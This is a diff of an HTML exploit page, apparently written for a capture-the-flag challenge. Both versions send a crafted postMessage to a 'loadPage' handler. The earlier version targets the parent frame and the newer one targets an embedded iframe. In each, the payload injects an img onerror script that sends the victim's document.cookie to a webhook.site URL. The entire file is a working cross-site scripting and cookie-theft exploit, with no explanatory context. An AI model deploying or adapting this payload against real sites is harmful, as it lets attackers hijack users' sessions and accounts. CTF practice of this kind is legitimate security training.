@@ -1,18 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Watch here</title>
+    <title>Password Security</title>
 </head>
 <body>
-    <script>
-        // Send a malicious message to parent frame
-        window.addEventListener('load', () => {
-            window.parent.postMessage({
-                method: 'loadPage',
-                argument: '"><img src=x onerror="location=`https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd?c=${document.cookie}`">'
-            }, '*');
-        });
-    </script>
-    <h1>Loading video about password security...</h1>
+    <iframe src="https://iitbtrustlab-pwn-the-author.chals.io/fetch" onload="this.contentWindow.postMessage({method: 'loadPage', argument: '</script><img src=x onerror=fetch(`https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd?c=${document.cookie}`)>'}, '*')">
+    </iframe>
 </body>
 </html>
